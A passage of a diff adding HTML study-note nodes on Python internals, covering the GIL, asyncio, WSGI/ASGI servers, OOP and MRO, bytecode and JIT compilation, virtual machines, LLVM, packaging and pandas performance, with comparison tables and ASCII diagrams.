+  data-bridge="The GIL blocks OS threads from running Python code in parallel on CPU-bound work. Asyncio sidesteps the problem entirely for I/O: one thread, one event loop, coroutines that suspend at await rather than blocking.">
+<h3>What the GIL Does</h3>
+<div class="compare">
+  <div><h4>CPU-bound (GIL hurts)</h4><pre>Core 0: [Thread A runs]│[Thread B]│...
+Core 1: IDLE            IDLE
+→ Only one thread runs at a time
+  even on multi-core! Use
+  multiprocessing instead.</pre></div>
+  <div><h4>I/O-bound (GIL releases)</h4><pre>Core 0: Thread A ──►[wait...]──► A
+                    Thread B runs ◄── GIL
+                    released during wait
+→ Real concurrency for I/O ✓</pre></div>
+</div>
+<h3>Why the GIL Exists</h3>
+<ul>
+  <li>Python's reference counting stores each object's <code>ob_refcnt</code> on the heap</li>
+  <li>Two threads modifying the same refcount simultaneously = memory corruption</li>
+  <li>GIL = one mutex protecting all CPython internals; simplest solution (added 1991)</li>
+  <li>Specific to <strong>CPython</strong> — Jython and IronPython have no GIL</li>
+  <li>GIL releases during I/O waits and C extensions that call <code>Py_BEGIN_ALLOW_THREADS</code></li>
+</ul>
+<h3>Process vs Thread vs Coroutine</h3>
+<table>
+  <thead><tr><th></th><th>Process</th><th>Thread</th><th>Coroutine (asyncio)</th></tr></thead>
+  <tbody>
+    <tr><td>Own GIL?</td><td>Yes (separate)</td><td>No (shared)</td><td>N/A (single thread)</td></tr>
+    <tr><td>Memory</td><td>Isolated</td><td>Shared</td><td>Shared</td></tr>
+    <tr><td>True parallelism?</td><td>Yes (multi-core)</td><td>No (GIL blocks)</td><td>No (1 thread)</td></tr>
+    <tr><td>I/O concurrency?</td><td>Yes</td><td>Yes (GIL releases)</td><td>Yes (await)</td></tr>
+    <tr><td>Overhead</td><td>High</td><td>Low</td><td>Very low</td></tr>
+    <tr><td>Use for</td><td>CPU-bound</td><td>I/O-bound legacy</td><td>I/O-bound async</td></tr>
+  </tbody>
+</table>
+<table>
+  <thead><tr><th>Concept</th><th>Process</th><th>Thread</th><th>User-level thread</th><th>Kernel-level thread</th></tr></thead>
+  <tbody>
+    <tr><td>Scheduling</td><td>OS, independently</td><td>OS or app</td><td>By library</td><td>OS, individually</td></tr>
+    <tr><td>If one blocks</td><td>Others unaffected</td><td>All may block (ULT)</td><td>All block</td><td>Only that thread</td></tr>
+    <tr><td>Context switch</td><td>Slow</td><td>Fast</td><td>Very fast</td><td>Slower (syscall)</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-02-04" data-type="node" data-trail="trail-02" data-order="4"
+  data-title="Asyncio"
+  data-file="Python/Asyncio.md"
+  data-bridge="With asyncio understood, compare it directly to how FastAPI (ASGI) and Django (WSGI) handle concurrency — and where Node.js fits as the single-threaded async alternative.">
+<h3>Sequential vs Concurrent</h3>
+<div class="compare">
+  <div><h4>Sequential (9 seconds)</h4><pre>t=0s ──► await fetch_a()
+t=3s ──► await fetch_b()
+t=6s ──► await fetch_c()
+t=9s     done</pre></div>
+  <div><h4>Concurrent (3 seconds)</h4><pre>t=0s ──► fetch_a() ─┐
+          fetch_b() ─┼─ all run together
+          fetch_c() ─┘
+t=3s     done ✓</pre></div>
+</div>
+<div class="warn">Use <code>asyncio.gather(a(), b(), c())</code> — not <code>await a(); await b(); await c()</code></div>
+<h3>Calling a Coroutine Does NOT Run It</h3>
+<pre>
+  fetch(url)                → creates a coroutine OBJECT, runs nothing
+  await fetch(url)          → runs now, this function waits
+  asyncio.create_task(...)  → schedules to run alongside other tasks
+  asyncio.gather(a(), b())  → runs both concurrently, waits for both</pre>
+<h3>The Abandoned Task Trap</h3>
+<pre>
+  WRONG:
+  task = asyncio.create_task(slow_fn())
+  # never await task → exception silently swallowed ✗
+
+  CORRECT (Python 3.11+):
+  async with asyncio.TaskGroup() as tg:
+      tg.create_task(slow_fn())
+      tg.create_task(other_fn())
+  # all tasks awaited; exceptions propagate ✓</pre>
+<h3>Blocking Code Freezes the Event Loop</h3>
+<div class="compare">
+  <div><h4>Wrong</h4><pre>async def handler():
+    time.sleep(5)    ← blocks
+    requests.get(url) ← blocks
+    # entire event loop
+    # frozen for 5s!</pre></div>
+  <div><h4>Correct</h4><pre>async def handler():
+    await asyncio.sleep(5)
+    await asyncio.to_thread(
+        requests.get, url
+    )  ← runs in thread pool</pre></div>
+</div>
+<ul>
+  <li>asyncio = cooperative multitasking; coroutines must explicitly <code>await</code> to yield</li>
+  <li>Still single-threaded — GIL applies; no actual CPU parallelism</li>
+  <li><code>asyncio.Semaphore(n)</code> limits concurrent coroutines (rate limiting APIs)</li>
+</ul>
+</template>
+
+<template id="node-02-05" data-type="node" data-trail="trail-02" data-order="5"
+  data-title="Node vs FastAPI and Asyncio Nuances"
+  data-file="Python/Node vs Fastapi and asyncio nuances.md"
+  data-bridge="Step back from concurrency specifics to the full server model: what WSGI and ASGI actually are, how Node.js differs as a runtime rather than a framework, and what Gunicorn vs Uvicorn actually do.">
+<h3>Concurrency Model Comparison</h3>
+<pre>
+  DJANGO / WSGI            FASTAPI / ASGI           NODE.JS
+  ─────────────────────    ─────────────────────    ────────────────────
+  req 1 ──► Worker 1       req 1 ──┐                req 1 ──┐
+  req 2 ──► Worker 2       req 2 ──┼─ event loop    req 2 ──┼─ event loop
+  req 3 ──► Worker 3       req 3 ──┘ (1 per proc)   req 3 ──┘ (libuv I/O)
+  concurrency = # workers  concurrency = many/loop  concurrency = many/loop</pre>
+<table>
+  <thead><tr><th></th><th>Django/WSGI</th><th>FastAPI/ASGI</th><th>Node.js</th></tr></thead>
+  <tbody>
+    <tr><td>Model</td><td>Multi-process</td><td>Async event loop</td><td>Async event loop</td></tr>
+    <tr><td>Auto docs</td><td>No</td><td>Swagger + ReDoc ✓</td><td>No</td></tr>
+    <tr><td>Type validation</td><td>Django forms</td><td>Pydantic ✓</td><td>Manual</td></tr>
+    <tr><td>Best for</td><td>Web apps, ORM</td><td>High-concurrency APIs</td><td>Real-time, streaming</td></tr>
+    <tr><td>GIL bypass</td><td>Yes (processes)</td><td>Yes (workers)</td><td>N/A</td></tr>
+  </tbody>
+</table>
+<h3>GIL and Multiple Workers</h3>
+<pre>
+  Single process (threads):     4 worker processes:
+  ──────────────────────────    ─────────────────────────────────
+  [Thread A][Thread B]          [Process 1 GIL] [Process 2 GIL]
+      └─ share one GIL               runs Core 1   runs Core 2
+      → only one runs at a time  → true parallelism ✓</pre>
+<div class="info">GIL is per-process — <code>uvicorn --workers 4</code> = 4 separate Python runtimes on 4 cores.</div>
+</template>
+
+<template id="node-02-06" data-type="node" data-trail="trail-02" data-order="6"
+  data-title="Python and JS Based Server Concepts"
+  data-file="Python/Python and JS based Server concepts.md"
+  data-bridge="The server stack overview names WSGI and ASGI — the next node goes deeper: the actual callable interfaces, why Gunicorn and Uvicorn are Python, what production servers add beyond HTTP parsing, and why the spec is what makes frameworks swappable.">
+<h3>Production Server Stacks</h3>
+<pre>
+  PYTHON / WSGI:
+  Browser → Nginx → Gunicorn (N worker processes) → Django/Flask
+
+  PYTHON / ASGI:
+  Browser → Nginx → Uvicorn (async event loop per worker) → FastAPI
+
+  NODE.JS:
+  Browser → Nginx → Node.js + Express/Fastify
+  (Node is the runtime AND server — no separate WSGI layer)</pre>
+<table>
+  <thead><tr><th></th><th>WSGI</th><th>ASGI</th></tr></thead>
+  <tbody>
+    <tr><td>Interface</td><td>Synchronous callable</td><td>Async callable</td></tr>
+    <tr><td>Concurrency</td><td>One request per worker</td><td>Many per event loop</td></tr>
+    <tr><td>WebSocket support</td><td>No</td><td>Yes</td></tr>
+    <tr><td>Servers</td><td>Gunicorn, uWSGI</td><td>Uvicorn, Daphne, Hypercorn</td></tr>
+    <tr><td>Frameworks</td><td>Django, Flask</td><td>FastAPI, Starlette, Django Channels</td></tr>
+  </tbody>
+</table>
+<h3>WebSocket vs SSE</h3>
+<div class="compare">
+  <div><h4>WebSocket</h4><pre>client ◄──────────► server
+bidirectional
+chat, gaming, collab tools</pre></div>
+  <div><h4>SSE</h4><pre>client ◄──────────── server
+server-to-client only
+dashboards, notifications</pre></div>
+</div>
+<ul>
+  <li>WSGI/ASGI are Python-specific; Java has Servlet API, Ruby has Rack, PHP has FastCGI</li>
+  <li>Node.js is a <strong>runtime</strong> (like CPython) — Express/Fastify are frameworks on top of it</li>
+  <li>Node.js has no WSGI/ASGI equivalent — its <code>http</code> module is the server interface</li>
+</ul>
+</template>
+
+<template id="node-02-07" data-type="node" data-trail="trail-02" data-order="8"
+  data-title="OOP Questions"
+  data-file="Python/OOP Questions.md"
+  data-bridge="OOP is about design; language nuances are about execution surprises. With the runtime model under your belt, mutable defaults, late binding, and is vs == now have clear causes.">
+<h3>The Four Pillars</h3>
+<div class="compare">
+  <div><h4>Encapsulation &amp; Abstraction</h4><pre>hide internals: _var, __var
+expose only interface
+@property for getter/setter
+ABC + @abstractmethod</pre></div>
+  <div><h4>Inheritance &amp; Polymorphism</h4><pre>class Dog(Animal):
+subclass gets parent attrs
+same method name, different
+behaviour per class</pre></div>
+</div>
+<h3>Method Types</h3>
+<table>
+  <thead><tr><th>Method type</th><th>Decorator</th><th>First arg</th><th>Accesses</th></tr></thead>
+  <tbody>
+    <tr><td>Instance method</td><td>(none)</td><td><code>self</code></td><td>instance + class</td></tr>
+    <tr><td>Class method</td><td><code>@classmethod</code></td><td><code>cls</code></td><td>class state only</td></tr>
+    <tr><td>Static method</td><td><code>@staticmethod</code></td><td>(none)</td><td>neither</td></tr>
+  </tbody>
+</table>
+<h3>MRO (C3 Linearization)</h3>
+<pre>
+  class A:      def greet(self): return "A"
+  class B(A):   pass
+  class C(A):   def greet(self): return "C"
+  class D(B, C): pass
+
+  D.__mro__ = (D, B, C, A, object)
+               ↑  ↑  ↑  ↑
+  lookup order: D  B  C  A  → C.greet() wins ("C")</pre>
+<h3>Key Magic Methods</h3>
+<table>
+  <thead><tr><th>Dunder</th><th>Triggered by</th><th>Purpose</th></tr></thead>
+  <tbody>
+    <tr><td><code>__init__</code></td><td><code>MyClass()</code></td><td>Constructor</td></tr>
+    <tr><td><code>__str__</code> / <code>__repr__</code></td><td><code>str(x)</code> / <code>repr(x)</code></td><td>Human / debug string</td></tr>
+    <tr><td><code>__eq__</code>, <code>__hash__</code></td><td><code>==</code>, <code>hash()</code></td><td>Override together</td></tr>
+    <tr><td><code>__len__</code>, <code>__getitem__</code></td><td><code>len(x)</code>, <code>x[i]</code></td><td>Container behaviour</td></tr>
+    <tr><td><code>__enter__</code>, <code>__exit__</code></td><td><code>with x:</code></td><td>Context manager</td></tr>
+  </tbody>
+</table>
+<ul>
+  <li><strong>Duck typing</strong>: if it has the method, use it — no explicit interface declaration needed</li>
+  <li><strong>Protocol</strong> (3.8+): structural subtyping for type checkers; not enforced at runtime</li>
+  <li>Prefer <strong>composition</strong> (has-a) over deep inheritance for flexibility</li>
+</ul>
+</template>
+
+<template id="node-02-08" data-type="node" data-trail="trail-02" data-order="9"
+  data-title="Language Nuances"
+  data-file="Python/Language Nuances.md"
+  data-bridge="After understanding how Python runs and structures code, this covers how you distribute it — virtual environments, Poetry, lock files, and the difference between wheel and sdist.">
+
+<h3>Execution Pipeline by Language</h3>
+<pre>
+  PYTHON:     source.py ──→ bytecode (.pyc) ──→ PVM interprets
+  JAVASCRIPT: source.js ──→ AST ──→ bytecode ──→ (JIT) native code for hot paths
+  C++:        source.cpp ──→ native machine code ──→ CPU runs directly
+                              ↑
+                         no VM layer</pre>
+<table>
+  <thead><tr><th>Language</th><th>Compiled to</th><th>When?</th><th>JIT?</th></tr></thead>
+  <tbody>
+    <tr><td>Python</td><td>Bytecode (.pyc)</td><td>Import time</td><td>No (CPython); Yes (PyPy)</td></tr>
+    <tr><td>JavaScript</td><td>Bytecode + machine code</td><td>At runtime (V8)</td><td>Yes (TurboFan)</td></tr>
+    <tr><td>C++</td><td>Machine code</td><td>Build step (AOT)</td><td>No</td></tr>
+  </tbody>
+</table>
+
+<h3>Bytecode — What It Is and When It Happens</h3>
+<p><strong>Bytecode</strong> is an intermediate representation — compiled from source, but not machine code. It targets a <strong>virtual machine (VM)</strong>, not real CPU hardware.</p>
+<pre>
+  source.py
+      │
+      ▼  compile (at import time)
+  bytecode (.pyc)        ← compact, VM-readable, not human-readable
+      │
+      ▼  interpret
+  machine code (CPU)</pre>
+<ul>
+  <li>Python compiles at <strong>import time</strong> — first load of a module triggers compilation</li>
+  <li>Result cached in <code>__pycache__/module.cpython-311.pyc</code></li>
+  <li>Edit the <code>.py</code> → timestamp changes → stale cache → recompiles</li>
+  <li>Upgrade Python 3.11 → 3.12 → old <code>.pyc</code> invalid (version encoded in filename)</li>
+</ul>
+<div class="compare">
+  <div><h4>Why not machine code directly?</h4>
+    <ul>
+      <li><strong>Portability</strong> — one <code>.pyc</code> runs on x86, ARM, Windows (same CPython version)</li>
+      <li><strong>Cheap to produce</strong> — just parse + flatten AST; no register allocation or optimization passes</li>
+      <li><strong>VM control layer</strong> — enforces bounds checking and memory safety</li>
+    </ul>
+  </div>
+  <div><h4>When .pyc actually matters in industry</h4>
+    <ul>
+      <li><strong>Source obfuscation</strong> — ship <code>.pyc</code> without <code>.py</code> to hide proprietary logic</li>
+      <li><strong>Frozen executables</strong> — PyInstaller bundles <code>.pyc</code> + CPython into one binary</li>
+      <li><strong>MicroPython</strong> — <code>.mpy</code> bytecode on 256KB-RAM embedded devices</li>
+      <li><strong>Docker</strong> — pre-compile during image build to speed up cold starts</li>
+    </ul>
+  </div>
+</div>
+<div class="info">For a FastAPI server you always have <code>.py</code> source — Python generates <code>__pycache__</code> automatically. The real benefit is just skipping re-parse on warm imports, not portability.</div>
+
+<h3>__pycache__</h3>
+<pre>
+  your_project/
+  ├── main.py
+  ├── utils.py
+  └── __pycache__/
+      ├── main.cpython-311.pyc     ← bytecode for main.py
+      └── utils.cpython-311.pyc    ← bytecode for utils.py</pre>
+<ul>
+  <li>Auto-created by Python — safe to delete, just regenerates</li>
+  <li>Should be in <code>.gitignore</code> — it's a build artifact</li>
+  <li>Read-only filesystem? Python still runs — just recompiles every time</li>
+</ul>
+
+<h3>PyPy — Python with a Built-in JIT</h3>
+<p>Drop-in replacement for CPython. Same Python code, different runtime.</p>
+<pre>
+  CPython:   bytecode ──→ interpreted line by line (forever)
+
+  PyPy:      bytecode ──→ interpreted
+                               │
+                               ▼ after ~1000 calls / loop iterations
+                          JIT compiler kicks in
+                               │
+                               ▼
+                          native machine code (much faster)</pre>
+<table>
+  <thead><tr><th></th><th>CPython</th><th>PyPy</th></tr></thead>
+  <tbody>
+    <tr><td>CPU-bound code</td><td>Slow</td><td>5–10× faster</td></tr>
+    <tr><td>Startup time</td><td>Fast</td><td>Slower (JIT warmup)</td></tr>
+    <tr><td>Memory</td><td>Lower</td><td>Higher</td></tr>
+    <tr><td>C extensions (numpy)</td><td>Native</td><td>Often broken/slow</td></tr>
+    <tr><td>Compatibility</td><td>Reference impl</td><td>~95%</td></tr>
+  </tbody>
+</table>
+<div class="warn">Most web servers (FastAPI, Django) are I/O-bound — JIT doesn't help <code>await db.query(...)</code>. PyPy shines for long-running CPU loops, not request handlers.</div>
+
+<h3>JIT — Deep Dive</h3>
+<pre>
+  ┌──────────────┬──────────────────────┬───────────────┐
+  │     AOT      │        JIT           │  Interpreted  │
+  │  (compile    │  (compile during     │  (never       │
+  │  before run) │   run, hot paths)    │   compile)    │
+  ├──────────────┼──────────────────────┼───────────────┤
+  │  C, Rust, Go │  PyPy, V8, JVM       │  CPython      │
+  │  fastest     │  fast after warmup   │  slowest      │
+  │  not portable│  portable            │  portable     │
+  └──────────────┴──────────────────────┴───────────────┘</pre>
+<p><strong>The profiling loop:</strong></p>
+<ol>
+  <li>Run bytecode normally</li>
+  <li>Profiler tracks: how many times called? what types are the variables <em>actually</em>?</li>
+  <li>"Hot path" threshold hit</li>
+  <li>JIT generates native machine code for THIS specific case — using real observed types</li>
+  <li>Future calls skip bytecode entirely and run native code</li>
+</ol>
+<div class="compare">
+  <div><h4>Type specialization (why JIT &gt; AOT sometimes)</h4>
+    <p>AOT must generate generic code for all possible types.<br>JIT sees real runtime types and specializes:</p>
+    <pre>def add(a, b): return a + b
+add(1, 2)   # JIT: always int+int
+            # → int-addition machine code
+            # → no type-check overhead</pre>
+  </div>
+  <div><h4>Deoptimization</h4>
+    <pre>add(1, 2)    # JIT compiled for int
+add(1, 2)    # fast ✓
+add("a","b") # type changed!
+             # → throw away compiled code
+             # → fall back to bytecode
+             # → may recompile for string</pre>
+    <p>Unpredictable types kill JIT performance.</p>
+  </div>
+</div>
+<pre>
+  Execution speed
+       │
+  slow │ ▓▓ ▓▓                           ← JIT profiling / warmup
+       │       ▓▓
+       │          ▓▓
+  fast │             ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ← native machine code (steady state)
+       └──────────────────────────────────▶ time
+              warmup        steady state</pre>
+
+<h3>V8 Pipeline (JavaScript / Node.js)</h3>
+<p>No separate compile step — everything happens at runtime inside V8.</p>
+<pre>
+  .js file
+      │
+      ▼
+   Parser ──→ AST
+      │
+      ▼
+  Ignition (bytecode compiler)
+      │  starts executing immediately
+      ▼
+  Profiler watches for hot code
+      │
+      ├── cold code ──→ stays as bytecode (Ignition interprets)
+      │
+      └── hot code ──→ TurboFan (JIT)
+                            │
+                            ▼
+                     native machine code
+                            │
+                     deoptimize if assumptions break
+                            │
+                            ▼
+                     back to bytecode</pre>
+<table>
+  <thead><tr><th></th><th>CPython</th><th>PyPy</th><th>V8 (Node.js)</th></tr></thead>
+  <tbody>
+    <tr><td>Bytecode cached to disk</td><td>Yes (.pyc)</td><td>No</td><td>No</td></tr>
+    <tr><td>JIT</td><td>No</td><td>Yes (after warmup)</td><td>Yes (always)</td></tr>
+    <tr><td>Type specialization</td><td>No</td><td>Yes</td><td>Yes (hidden classes)</td></tr>
+    <tr><td>Deoptimization</td><td>N/A</td><td>Yes</td><td>Yes</td></tr>
+    <tr><td>C extension support</td><td>Native</td><td>Poor</td><td>Native (N-API)</td></tr>
+  </tbody>
+</table>
+<h4>Hidden Classes — V8's Runtime Type System</h4>
+<p>V8 invents internal type representations at runtime so TurboFan can specialize code:</p>
+<pre>
+  function Point(x, y) {
+      this.x = x   // hidden class C0 ──→ C1
+      this.y = y   // C1 ──→ C2
+  }
+  const p1 = new Point(1, 2)  // shape C2 — TurboFan optimizes for this ✓
+  const p2 = new Point(3, 4)  // reuses C2 — same optimized path ✓
+  p2.z = 7                    // new property ──→ hidden class C3 ──→ deoptimizes ✗</pre>
+<div class="warn">This is why "don't add properties to objects after creation" is a JS performance rule — it breaks the hidden class chain and forces deoptimization.</div>
+<div class="info">V8 difference from PyPy: JIT is always on by default. CPython requires switching to PyPy entirely to get JIT. Every Node.js app benefits from TurboFan automatically on hot paths.</div>
+
+<h3>Frontend Framework Reference</h3>
+<table>
+  <thead><tr><th>Framework</th><th>Type</th><th>Key idea</th></tr></thead>
+  <tbody>
+    <tr><td>React</td><td>UI library</td><td>Virtual DOM, component-based, JSX, unidirectional data flow</td></tr>
+    <tr><td>Vue</td><td>Framework</td><td>Reactive data binding, single-file components, progressive</td></tr>
+    <tr><td>Angular</td><td>Full framework</td><td>TypeScript-first, built-in routing/forms/HTTP/DI, opinionated</td></tr>
+    <tr><td>Next.js</td><td>React meta-fw</td><td>SSR, SSG, file-based routing, API routes on top of React</td></tr>
+    <tr><td>Svelte</td><td>Compiler</td><td>Compiles to imperative DOM updates at build time; no virtual DOM</td></tr>
+    <tr><td>Bootstrap</td><td>CSS framework</td><td>Pre-built responsive grid and UI components; not a JS framework</td></tr>
+  </tbody>
+</table>
+
+<h3>System VM vs Process VM — Two Different Things</h3>
+<div class="compare">
+  <div><h4>Type 1 — System VM (VMware, VirtualBox, WSL)</h4>
+    <pre>
+  Physical hardware (your laptop)
+  └── Hypervisor (VMware / Hyper-V / KVM)
+      ├── Guest OS 1 (Ubuntu)
+      │   └── thinks it has real CPU, RAM, disk
+      └── Guest OS 2 (Windows)</pre>
+    <ul>
+      <li>Intercepts every hardware instruction from the guest OS</li>
+      <li>Guest OS has no idea it's not on real hardware</li>
+      <li><strong>What it virtualizes:</strong> CPU, RAM, disk, network — the whole machine</li>
+      <li><strong>Purpose:</strong> isolation, run multiple OSes on one machine</li>
+    </ul>
+  </div>
+  <div><h4>Type 2 — Process VM / Language Runtime (JVM, PVM, CLR, V8)</h4>
+    <pre>
+  Your script
+      ↓
+  Language VM (normal process on your OS)
+      ↓  interprets each bytecode instruction
+  Real CPU executes the VM's own machine code</pre>
+    <ul>
+      <li>Does not emulate hardware at all</li>
+      <li>Reads a made-up bytecode instruction set, translates to real machine code</li>
+      <li><strong>What it virtualizes:</strong> a CPU instruction set (the JVM ISA, Python bytecode ISA)</li>
+      <li><strong>Purpose:</strong> portability + memory safety</li>
+    </ul>
+  </div>
+</div>
+<table>
+  <thead><tr><th></th><th>System VM</th><th>Process VM</th></tr></thead>
+  <tbody>
+    <tr><td>Abstracts</td><td>Physical hardware</td><td>CPU instruction set</td></tr>
+    <tr><td>Examples</td><td>VMware, VirtualBox, WSL</td><td>JVM, CPython, CLR, V8</td></tr>
+    <tr><td>Runs</td><td>A whole OS</td><td>A single program</td></tr>
+    <tr><td>Memory managed by</td><td>Guest OS</td><td>The VM itself</td></tr>
+  </tbody>
+</table>
+<div class="info">Both use the same word for the same reason: both create an abstraction layer that says "write for me, not for real hardware — I'll handle the translation."</div>
+
+<h3>Process VM Landscape Across Languages</h3>
+<table>
+  <thead><tr><th>Language</th><th>VM</th><th>Bytecode format</th><th>JIT?</th></tr></thead>
+  <tbody>
+    <tr><td>Python</td><td>CPython VM (PVM)</td><td>.pyc</td><td>No (PyPy adds it)</td></tr>
+    <tr><td>Java</td><td>JVM (HotSpot)</td><td>.class files</td><td>Yes (C2 compiler)</td></tr>
+    <tr><td>Kotlin / Scala / Clojure</td><td>JVM</td><td>.class files</td><td>Yes (same HotSpot)</td></tr>
+    <tr><td>C# / F#</td><td>CLR (.NET Runtime)</td><td>CIL / MSIL</td><td>Yes (RyuJIT)</td></tr>
+    <tr><td>Ruby</td><td>YARV</td><td>in-memory</td><td>Partial</td></tr>
+    <tr><td>PHP</td><td>Zend Engine</td><td>OPcache opcodes</td><td>Partial</td></tr>
+    <tr><td>Erlang / Elixir</td><td>BEAM VM</td><td>.beam files</td><td>No</td></tr>
+    <tr><td>Lua</td><td>Lua VM</td><td>in-memory</td><td>No (LuaJIT adds it)</td></tr>
+    <tr><td>JavaScript</td><td>V8 / SpiderMonkey / JSC</td><td>in-memory</td><td>Yes (always)</td></tr>
+  </tbody>
+</table>
+<div class="info">JVM is dominant — Kotlin, Scala, Groovy, Clojure all compile to .class bytecode and ride the same HotSpot JIT. "Runs on the JVM" is a selling point because HotSpot is one of the most battle-tested runtimes ever built.</div>
+<div class="info">BEAM (Erlang/Elixir) is notable not for speed but fault tolerance — the VM enforces a concurrency model of millions of lightweight processes with "let it crash" semantics.</div>
+
+<h3>CPython: Compiler vs PVM Are Two Separate Components</h3>
+<p>PVM's responsibility starts <strong>only at bytecode</strong>. The source → bytecode step is a separate CPython component.</p>
+<pre>
+  script.py
+      │
+      ▼
+  ┌────────────────────────────────┐
+  │       CPython Compiler         │  ← NOT the PVM
+  │  Lexer → Parser → AST          │
+  │  → Compiler → bytecode         │    lives in parser/compiler modules
+  └────────────────────────────────┘
+      │
+      │  .pyc (the handoff point)
+      ▼
+  ┌────────────────────────────────┐
+  │             PVM                │  ← PVM starts here
+  │  reads each bytecode opcode    │    lives in Python/ceval.c
+  │  executes on real hardware     │
+  └────────────────────────────────┘</pre>
+<div class="info">Both are part of the same CPython binary and run sequentially when you call <code>python script.py</code>. But they are separate components with separate jobs. Compiler output = .pyc. PVM input = .pyc.</div>
+
+<h3>AST — Universal Compiler Tool (Not Specific to VMs)</h3>
+<p>AST exists in <strong>every language</strong> — compiled, interpreted, and JIT. It's a compiler scratch pad, not a runtime concept.</p>
+<pre>
+  int x = a + b * 2;   ← flat text, ambiguous
+
+          Assignment
+          ├── x
+          └── BinaryExpr (+)
+                  ├── a
+                  └── BinaryExpr (*)
+                          ├── b
+                          └── 2        ← tree is unambiguous, walkable</pre>
+<ul>
+  <li><strong>Type check</strong> — walk tree, verify <code>a</code> and <code>b</code> are ints</li>
+  <li><strong>Optimize</strong> — spot <code>b * 2</code> can become <code>b &lt;&lt; 1</code></li>
+  <li><strong>Code gen</strong> — walk tree, emit instructions in correct order</li>
+  <li><strong>Always discarded</strong> after compilation — never persisted, just a scratch pad</li>
+</ul>
+<table>
+  <thead><tr><th></th><th>Compiled (C, Rust, Go)</th><th>Bytecode VM (Python, Java, JS)</th></tr></thead>
+  <tbody>
+    <tr><td>Has AST?</td><td>Yes</td><td>Yes</td></tr>
+    <tr><td>Used for</td><td>type checking, optimization, machine code gen</td><td>same — outputs bytecode instead</td></tr>
+    <tr><td>Persisted?</td><td>No — discarded after compile</td><td>No — discarded after bytecode produced</td></tr>
+    <tr><td>Output</td><td>machine code binary</td><td>bytecode</td></tr>
+  </tbody>
+</table>
+
+<h3>Compiler Frontend vs Backend — and LLVM</h3>
+<p>Every compiler has two halves:</p>
+<pre>
+  Source code
+      ↓
+  ┌─────────────────────┐
+  │  Compiler Frontend  │  ← knows the SOURCE LANGUAGE (language-specific)
+  │  Lex → Parse → AST  │
+  │  Type checking      │
+  │  Produces IR        │
+  └─────────────────────┘
+      ↓  IR (Intermediate Representation)
+  ┌─────────────────────┐
+  │  Compiler Backend   │  ← knows the TARGET HARDWARE (architecture-specific)
+  │  Optimization       │
+  │  Machine code gen   │
+  └─────────────────────┘
+      ↓
+  Machine code</pre>
+<p><strong>LLVM</strong> is a reusable compiler backend. Languages compile to <strong>LLVM IR</strong> and get every CPU architecture for free:</p>
+<pre>
+  C/C++  → Clang (frontend)  → LLVM IR ─┬─→ x86-64  (laptop)
+  Rust   → rustc (frontend)  → LLVM IR  ├─→ ARM      (phone)
+  Swift  → swiftc (frontend) → LLVM IR  ├─→ RISC-V   (embedded)
+                                         └─→ WASM     (browser)</pre>
+<div class="compare">
+  <div><h4>Languages using LLVM backend</h4>
+    <ul>
+      <li><strong>C/C++</strong> via Clang — Clang is just the frontend</li>
+      <li><strong>Rust</strong> via rustc — LLVM is why Rust targets so many platforms</li>
+      <li><strong>Swift</strong> via swiftc — Apple's language, fully LLVM-backed</li>
+      <li><strong>Kotlin Native</strong> — Kotlin targeting non-JVM platforms (iOS, embedded)</li>
+    </ul>
+  </div>
+  <div><h4>Languages with their own backend (no LLVM)</h4>
+    <ul>
+      <li><strong>C/C++</strong> via GCC — GCC has its own backend, pre-dates LLVM</li>
+      <li><strong>Go</strong> via <code>gc</code> — Go's own compiler, not LLVM</li>
+      <li>Clang vs GCC: same output (machine code), different toolchain</li>
+    </ul>
+  </div>
+</div>
+<div class="warn">C/C++ via LLVM/Clang is still a compiled language — output is native machine code, no VM at runtime. LLVM is a build-time tool only. By the time your binary runs, LLVM is long gone.</div>
+</template>
+
+<template id="node-02-09" data-type="node" data-trail="trail-02" data-order="10"
+  data-title="Packaging in Python"
+  data-file="Python/Packaging in python.md"
+  data-bridge="With Python's runtime fully understood, pandas is its most demanding application — this guide explains how pandas leverages NumPy, SIMD vectorization, and column-oriented storage for 100–200x speedups.">
+<h3>Virtual Environments</h3>
+<div class="compare">
+  <div><h4>Without venv</h4><pre>System Python
+└─ site-packages
+    ├── requests==2.28
+    └── django==3.2
+All projects share packages.
+Version conflicts!</pre></div>
+  <div><h4>With venv</h4><pre>project-a/.venv/
+  └─ requests==2.31
+     django==4.2
+project-b/.venv/
+  └─ requests==2.28 ✓
+Each project isolated.</pre></div>
+</div>
+<h3>Lock Files Across Ecosystems</h3>
+<table>
+  <thead><tr><th>Tool</th><th>Lock file</th><th>Language</th></tr></thead>
+  <tbody>
+    <tr><td>Poetry</td><td>poetry.lock</td><td>Python</td></tr>
+    <tr><td>Pipenv</td><td>Pipfile.lock</td><td>Python</td></tr>
+    <tr><td>npm</td><td>package-lock.json</td><td>JavaScript</td></tr>
+    <tr><td>Yarn</td><td>yarn.lock</td><td>JavaScript</td></tr>
+  </tbody>
+</table>
+<div class="info"><code>pyproject.toml</code> says "I need requests &gt;= 2.28" — <code>poetry.lock</code> says "install requests == 2.31.0 exactly". Same result on every machine ✓</div>
+<table>
+  <thead><tr><th></th><th>Wheel (.whl)</th><th>Source dist (.tar.gz)</th></tr></thead>
+  <tbody>
+    <tr><td>Pre-built?</td><td>Yes</td><td>No (build on target)</td></tr>
+    <tr><td>Install speed</td><td>Fast</td><td>Slow</td></tr>
+    <tr><td>Compilation needed?</td><td>No</td><td>Yes</td></tr>
+    <tr><td>Platform</td><td>Platform-specific</td><td>Universal</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-02-10" data-type="node" data-trail="trail-02" data-order="11"
+  data-title="Pandas Reference Guide"
+  data-file="Python/PANDAS_REFERENCE_GUIDE.md"
+  data-bridge="">
+<h3>Performance vs Pure Python</h3>
+<table>
+  <thead><tr><th>Operation (1M rows)</th><th>Pure Python</th><th>pandas</th><th>Speedup</th></tr></thead>
+  <tbody>
+    <tr><td>Iterate + sum</td><td>~3.0 s</td><td>~0.015 s</td><td>200×</td></tr>
+    <tr><td>groupby + mean</td><td>~8.0 s</td><td>~0.04 s</td><td>200×</td></tr>
+    <tr><td>merge two DataFrames</td><td>~12.0 s</td><td>~0.1 s</td><td>120×</td></tr>
+  </tbody>
+</table>
+<h3>Internal Architecture</h3>
+<pre>
+  Your pandas code (Python)
+         │
+         ▼
+  ┌──────────────────────────────────────────────┐
+  │          pandas API (Python layer)            │
+  ├──────────────────────────────────────────────┤
+  │            Cython / C internals              │
+  │   groupby  │  merge  │  rolling              │
